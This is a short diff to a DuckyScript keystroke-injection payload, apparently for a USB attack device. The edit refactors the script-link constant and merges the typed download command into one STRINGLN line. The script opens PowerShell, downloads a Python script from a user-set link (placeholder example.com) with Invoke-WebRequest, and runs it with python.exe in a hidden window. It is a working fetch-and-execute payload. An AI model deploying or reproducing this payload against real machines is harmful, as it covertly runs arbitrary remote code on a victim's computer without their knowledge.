@@ -13,7 +13,7 @@ REM Requirements:
 REM     - Internet Connection
 
 REM REQUIRED - Set your Python script link
-DEFINE SCRIPT-PY-LINK example.com
+DEFINE #SCRIPT-PY-LINK example.com
 
 
 DELAY 1000
@@ -23,10 +23,7 @@ STRING powershell
 ENTER
 DELAY 500
 
-STRING Invoke-WebRequest -Uri "
-STRING SCRIPT-PY-LINK
-STRING " -OutFile "script.py"
-ENTER
+STRINGLN Invoke-WebRequest -Uri "#SCRIPT-PY-LINK" -OutFile "script.py"
 DELAY 500
 
 STRINGLN Start-Process python.exe -ArgumentList "script.py" -WindowStyle Hidden
